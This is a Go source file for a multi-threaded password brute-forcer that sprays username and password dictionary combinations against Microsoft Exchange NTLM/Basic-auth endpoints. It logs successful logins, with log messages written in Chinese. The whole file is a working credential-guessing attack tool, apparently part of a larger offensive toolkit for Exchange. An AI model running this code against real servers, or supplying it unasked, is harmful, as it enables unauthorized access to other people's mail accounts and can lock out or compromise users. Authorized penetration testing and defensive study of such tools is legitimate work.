package lib

import (
	"net/http"
	"net/url"
	"sync"
	"time"
)

func NtlmBruteWorker(u string, domain string, task chan []string, delay int) {

	for data := range task {
		username, password := data[0], data[1]
		Log.Debug("[*] 尝试: %v:%v", username, password)
		req, _ := http.NewRequest("GET", u, nil)
		req.SetBasicAuth(domain+"\\"+username, password)
		res, _ := NtlmClient.Do(req)
		if res.StatusCode == 403 {
			Log.Failed("[*] 403 错误")
		} else if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			Log.Success("[+] 成功: %v", username+":"+password)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(delay))
	}
}

func NtlmBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int, delay int) {

	authPath := ExchangeUrls[mode]
	u, _ := url.JoinPath(targetUrl, authPath)
	Log.Info("[*] 使用 %v 接口爆破: %v", mode, targetUrl)

	task := make(chan []string, len(userDict)*len(passDict))

	t1 := time.Now()

	for _, username := range userDict {
		for _, password := range passDict {
			data := []string{username, password}
			task <- data
		}
	}
	close(task)

	var wg sync.WaitGroup

	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			NtlmBruteWorker(u, domain, task, delay)
		}()
	}

	wg.Wait()

	t2 := time.Now()
	Log.Info("[*] 耗时: %v", t2.Sub(t1))
}
